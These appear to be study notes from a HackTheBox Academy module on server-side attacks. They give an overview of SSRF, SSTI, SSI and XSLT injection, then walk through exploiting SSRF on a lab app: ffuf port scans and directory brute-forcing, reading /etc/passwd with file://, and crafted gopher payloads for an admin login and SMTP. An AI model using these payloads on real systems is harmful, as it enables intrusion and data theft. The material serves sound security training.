# Introduction
Server-side attacks target the application or service provided by a **server**, whereas a client-side attack takes place at the **client's machine**, not the server itself.

For instance, vulnerabilities like **Cross-Site Scripting (XSS)** target the web browser, i.e., the client. On the other hand, server-side attacks target the web server. We will go over four classes of server-side vulnerabilities:

- Server-Side Request Forgery (SSRF)
- Server-Side Template Injection (SSTI)
- Server-Side Includes (SSI) Injection
- eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection
## Server-Side Request Forgery (SSRF)
[Server-Side Request Forgery (SSRF)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery) is a vulnerability where **an attacker can manipulate a web application into sending unauthorized requests from the server.** This vulnerability often occurs when an application makes **HTTP** requests to other servers based on **user input**. Successful exploitation of SSRF can enable an attacker to **access internal systems, bypass firewalls, and retrieve sensitive information.**

## Server-Side Template Injection (SSTI)
Web applications can utilize templating engines and server-side templates to generate responses such as **HTML** content dynamically. This generation is often based on user input, enabling the web application to respond to user input dynamically. When an attacker can inject template code, a [Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection) vulnerability can occur. SSTI can lead to various security risks, including **data leakage** and even **full server compromise via remote code execution**.

## Server-Side Includes (SSI) Injection
Similar to **server-side templates**, server-side includes (**SSI**) can be used to generate **HTML** responses dynamically. SSI directives instruct the webserver to include additional content dynamically. These directives are embedded into **HTML** files. For instance, **SSI** can be used to include content that is present in all **HTML** pages, such as headers or footers. When an attacker can inject commands into the **SSI** directives, [Server-Side Includes (SSI) Injection](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection) can occur. **SSI** injection can lead to **data leakage** or even **remote code execution**.

## eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection
**XSLT** server-side injection is a vulnerability that arises when an attacker can manipulate **XSLT transformations** performed on the server. **XSLT** is a language used to transform **XML** documents into other formats, such as **HTML**, and is commonly employed in web applications to generate content dynamically. In the context of **XSLT** server-side injection, attackers exploit weaknesses in how **XSLT** transformations are handled, allowing them to inject and execute **arbitrary code** on the server.

# SSRF
## Introduction to SSRF
This type of vulnerability occurs **when a web application fetches additional resources from a remote location based on user-supplied data, such as a URL.**

---
Suppose a web server fetches remote resources based on user input. In that case, an attacker might be able to coerce the server into making requests to arbitrary URLs supplied by the attacker, (i.e., the web server is vulnerable to SSRF)
While this might not sound particularly bad at first, depending on the web app's configuration, SSRF vulnerabilities can have devastating consequences.

Furthermore, if the web application relies on a **user-supplied URL** scheme or protocol, an attacker might be able to cause even further undesired behaviour by manipulating the URL scheme. For instance, the following URL schemes are commonly used in the exploitation of SSRF vulnerabilities:

- `http://` and `https://`: These **URL** schemes fetch content via **HTTP/S** requests. An attacker might use this in the exploitation of **SSRF** vulnerabilities to **bypass WAFs**, **access restricted endpoints, or access endpoints in the internal network**

- `file://`: This **URL** scheme **reads a file from the local file system**. An attacker might use this in the exploitation of **SSRF** vulnerabilities to read local files on the web server (**LFI**)

- `gopher://`: This protocol can send arbitrary bytes to the specified address. An attacker might use this in the exploitation of **SSRF** vulnerabilities to send **HTTP POST** requests with arbitrary payloads or communicate with other services such as SMTP servers or databases
## Identifying SSRF
Looking at the vulnerable web app, we are greeted with some generic text as well as functionality to schedule appointments:
![[Pasted image 20241215182051.png]]

After checking the availability of a date, we can observe the following request in **Burp**:
![[Pasted image 20241215182128.png]]The request contains our chosen date and a **URL** in the parameter `dateserver`. This indicates that the web server fetches the availability information from a separate system determined by the **URL** passed in this **POST** parameter.

To confirm an **SSRF** vulnerability, let us supply a **URL** pointing to our system to the web application:
![[Pasted image 20241215182215.png]]
In a `netcat` listener, we can receive a connection, thus confirming **SSRF**:
![[Pasted image 20241215182236.png]]

To determine whether the **HTTP** response reflects the **SSRF** response to us, let us point the web application to itself by providing the **URL** `http://127.0.0.1/index.php`:
![[Pasted image 20241215182349.png]]Since the response contains the web application's **HTML** code, the **SSRF** vulnerability is not blind, (i.e., the response is displayed to us).
## Enumerating the System
We can use the **SSRF** vulnerability to conduct a port scan of the system to enumerate running services. To achieve this, we need to be able to infer whether a port is open or not from the response to our **SSRF** payload. If we supply a port that we assume is closed (such as `81`), the response contains an error message:
![[Pasted image 20241215182514.png]]
This allows us to conduct an internal port scan of the web server through the **SSRF** vulnerability. We can do this using a fuzzer like `ffuf`. Let us first create a wordlist of the ports we want to scan. In this case, we'll use the first 10,000 ports:
```bash
seq 1 10000 > ports.txt
```

Now, we can fuzz all open ports by filtering out responses containing the error message:
```bash
ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```
**Result:** 
```bash
[Status: 200, Size: 45, Words: 7, Lines: 1, Duration: 0ms]
    * FUZZ: 3306
[Status: 200, Size: 8285, Words: 2151, Lines: 158, Duration: 338ms]
    * FUZZ: 80
```
**Code explained**:
``` bash
-w ./ports.txt | "Tells the ffuf which wordlist to use"

-u http://172.17.0.2/index.php | "Specify the url to fuzz"

-X POST | "Specify the request type (e.g. POST or GET)"

-H "Content-Type: application/x-www-form-urlencoded" | "Apply header"

-d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" | "The data to send, the same line is in the burpsuite request"

-fr "Failed to connect to" | "Filter out responses containing this message"
```

The results show that the web server runs a service on port `3306`, typically used for a **SQL** database. If the web server ran other internal services, such as internal web applications, we could also identify and access them through the **SSRF** vulnerability.
## Exploiting SSRF
### Accessing Restricted Endpoints
The web application fetches availability information from the **URL** `dateserver.htb`. However, when we add this domain to our **hosts** file and attempt to access it, we are unable to do so:
![[Pasted image 20241216002352.png]]

However, we can access and enumerate the domain through the **SSRF** vulnerability. For instance, we can conduct a **directory brute-force** attack to enumerate additional endpoints using `ffuf`. To do so, let us first determine the web server's response when we access a non-existing page:
![[Pasted image 20241216002434.png]]
The web server responds with the default Apache **404** response. To also filter out any **HTTP 403** responses, we will filter our results based on the string `Server at dateserver.htb Port 80`, which is contained in default Apache error pages. Since the web application runs **PHP**, we will specify the `.php` extension:
```bash
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```

> [!NOTE]
>  If you want to know the explanation of this code look at [[#Enumerating the System]].

The response should look something like:
```shell
[Status: 200, Size: 361, Words: 55, Lines: 16, Duration: 3872ms]
    * FUZZ: admin
[Status: 200, Size: 11, Words: 1, Lines: 1, Duration: 6ms]
    * FUZZ: availability
```
We have successfully identified an additional internal endpoints that we can now access through the **SSRF** vulnerability by specifying the URL `http://dateserver.htb/admin.php` in the `dateserver` **POST** parameter to potentially access sensitive admin information.
### Local File Inclusion (LFI) 
Since the **URL** scheme is part of the **URL** supplied to the web application, let us attempt to read **local files** from the file system using the `file://` **URL** scheme. We can achieve this by supplying the **URL** `file:///etc/passwd`:
![[Pasted image 20241216003144.png]]
We can use this to read arbitrary files on the filesystem, including the web app's source code. For more details LFI, check out the [File Inclusion](https://academy.hackthebox.com/module/details/23) module from HackTheBox.
###  The gopher Protocol
As we know, we can use **SSRF** to access **restricted internal endpoints**. However, we are restricted to **GET** requests as there is no way to send a **POST** request with the `http://` **URL** scheme. For instance, let us consider a different version of the previous web app. Assuming we identified the internal endpoint `/admin.php` just like before, however, this time the response looks like this:
![[Pasted image 20241216003516.png]]
As we can see, the admin endpoint is protected by a login prompt. From the **HTML** form, we can deduce that we need to send a **POST** request to `/admin.php` containing the password in the `adminpw` **POST** parameter. However, there is no way to send this **POST** request using the `http://` **URL** scheme.

Instead, we can use the [gopher](https://datatracker.ietf.org/doc/html/rfc1436) **URL** scheme to send arbitrary bytes to a **TCP socket**. This protocol enables us to create a **POST** request by building the **HTTP** request ourselves.

Assuming we want to try common weak passwords, such as `admin`, we can send the following **POST** request:
```http
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

We need to **URL-encode** all special characters to construct a valid **gopher URL** from this. In particular, spaces (`%20`) and newlines (`%0D%0A`) must be **URL-encoded**. Afterward, we need to prefix the data with the **gopher** **URL** scheme, the **target host and port**, and an **underscore**, resulting in the following **gopher** **URL** :
```gopher
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```
Our specified bytes are sent to the **target** when the web app processes this URL. Since we carefully chose the bytes to represent a valid **POST** request, the internal web server accepts our **POST** request and responds accordingly. However, since we are sending our **URL** within the **HTTP POST** parameter `dateserver`, which itself is **URL-encoded**, we need to **URL-encode** the entire **URL** again to ensure the correct format of the **URL** after the web server accepts it. Otherwise, we will get a `Malformed URL` error. After **URL encoding** the entire **gopher URL** one more time, we can finally send the following request:
```http
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```
We can use the `gopher` to interact with many internal services, not just **HTTP** servers. Imagine a scenario where we identify, through an **SSRF** vulnerability, that **TCP port 25** is open locally. This is the standard port for **SMTP** servers. We can use **gopher** to interact with this internal **SMTP** server as well. However, constructing syntactically and semantically correct **gopher URL**s can take time and effort. Thus, we will utilize the tool [Gopherus](https://github.com/tarunkant/Gopherus) to generate **gopher URL**s for us. The following services are supported:
- MySQL
- PostgreSQL
- FastCGI
- Redis
- SMTP
- Zabbix
- pymemcache
- rbmemcache
- phpmemcache
- dmpmemcache
To run the tool, we need a valid **Python2** installation. Afterward, we can run the tool by executing the Python script downloaded from the GitHub repository:
```bash
$ python2.7 gopherus.py

  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

usage: gopherus.py [-h] [--exploit EXPLOIT]

optional arguments:
  -h, --help         show this help message and exit
  --exploit EXPLOIT  mysql, postgresql, fastcgi, redis, smtp, zabbix,
                     pymemcache, rbmemcache, phpmemcache, dmpmemcache
```
Let us generate a valid **SMTP URL** by supplying the corresponding argument. The tool asks us to input details about the **email** we intend to send. Afterward, we are given a valid gopher URL that we can use in our **SSRF** exploitation:
```bash
$ python2.7 gopherus.py --exploit smtp
..SNIP..
Give Details to send mail: 

Mail from :  attacker@academy.htb
Mail To :  victim@academy.htb
Subject :  HelloWorld
Message :  Hello from SSRF!

Your gopher link is ready to send Mail: 

gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40academy.htb%0ADATA%0AFrom:attacker%40academy.htb%0ASubject:HelloWorld%0AMessage:Hello%20from%20SSRF%21%0A.

-----------Made-by-SpyD3r-----------
```

---
## Blind SSRF